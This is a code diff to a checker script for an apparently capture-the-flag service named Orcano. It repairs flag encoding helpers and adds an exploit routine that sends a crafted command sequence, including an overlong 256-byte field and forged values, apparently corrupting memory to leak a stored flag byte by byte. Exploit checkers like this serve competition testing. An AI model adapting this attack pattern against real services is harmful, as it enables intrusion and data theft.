@@ -4,6 +4,7 @@ from enochecker import BaseChecker, BrokenServiceException, EnoException, run
 from enochecker.utils import SimpleSocket, assert_equals, assert_in
 
 import secrets
+import re
 
 def rand_uint():
 	return secrets.randbits(31)
@@ -46,7 +47,7 @@ class OrcanoChecker(BaseChecker):
 	def flag_to_nums(self, flag):
 		nums = []
 		chunk_len = 3;
-		flag_data = self.flag.encode()
+		flag_data = flag.encode()
 		for ck in chunks(flag_data, chunk_len):
 			num = 0
 			for i in range(chunk_len):
@@ -55,20 +56,22 @@ class OrcanoChecker(BaseChecker):
 					num |= ck[i]
 			nums.append(num)
 		return nums
-	"""def flag_from_nums(self, nums):
-		flag_data = b""
+	def flag_from_nums(self, nums):
+		flag_data = bytearray()
 		chunk_len = 3
 		for n in nums:
 			remaining = n
-			num_chars = b""
+			num_chars = bytearray()
 			for i in range(chunk_len):
 				d = remaining & 0xff
 				remaining >>= 8
 				if d == 0:
-					break
+					continue
 				num_chars.append(d)
-			flag_data.append(remaining[::-1])
-		return flag_data.decode()"""
+			flag_data += num_chars[::-1]
+			if len(num_chars) != chunk_len:
+				break
+		return flag_data.decode()
 
 	def gen_creds(self):
 		uid0 = rand_sint()
@@ -218,7 +221,6 @@ class OrcanoChecker(BaseChecker):
 	# Entrypoints
 	def putflag(self):
 		if self.variant_id == 0:
-			self.debug("PUTFLAG")
 			# Encode flag into numbers
 			nums = self.flag_to_nums(self.flag)
 
@@ -309,7 +311,57 @@ class OrcanoChecker(BaseChecker):
 		raise EnoException("havoc bad variant_id")
 
 	def exploit(self):
-		raise EnoException("exploit bad variant_id")
+		if self.variant_id == 0:
+			if not self.attack_info:
+				raise BrokenServiceException("exploit previous putflag failed")
+			
+			m = re.fullmatch(r":i([-+]?\d+):i([-+]?\d+)", self.attack_info)
+			if not m:
+				raise BrokenServiceException("exploit bad attack_info")
+
+			user0 = m[1]
+			user1 = m[2]
+
+			nums = []
+			conn = self.begin_conn()
+			for i in range(32): # some max for flag len since self.flag isn't accessible
+				exploit_cmds = [
+					"user",
+					"del",
+					"weight:" + ("A" * 256),
+					"del",
+				]
+				exploit_cmds += [
+					"int:i{}".format(i),
+					"int:i{}".format(user1),
+					"int:i{}".format(user0),
+					"int:i0xc",
+					"int:i0x47544e51",
+					"inspect:i5:pAPsA",
+					"getn:i0",
+				]
+
+				result = self.make_request(conn, exploit_cmds)
+				if not result["ok"]:
+					self.debug("Failed to get flag byte {}, err: {}".format(i, result["err"]))
+					raise BrokenServiceException("exploit request error")
+				if len(result["out"]) != 1 or not isinstance(result["out"][0], int):
+					self.debug("Bad response for flag byte {}, out: {}".format(i, result["out"]))
+					raise BrokenServiceException("exploit bad response")
+				num = result["out"][0]
+				if not num:
+					break
+				nums.append(num)
+			self.end_conn(conn)
+
+			got_flag = self.flag_from_nums(nums)
+			self.debug("Got flag: {}".format(got_flag))
+			if not self.search_flag(got_flag):
+				raise BrokenServiceException("exploit no flag")
+
+			return got_flag
+		else:
+			raise EnoException("exploit bad variant_id")
 
 app = OrcanoChecker.service
 if __name__ == "__main__":
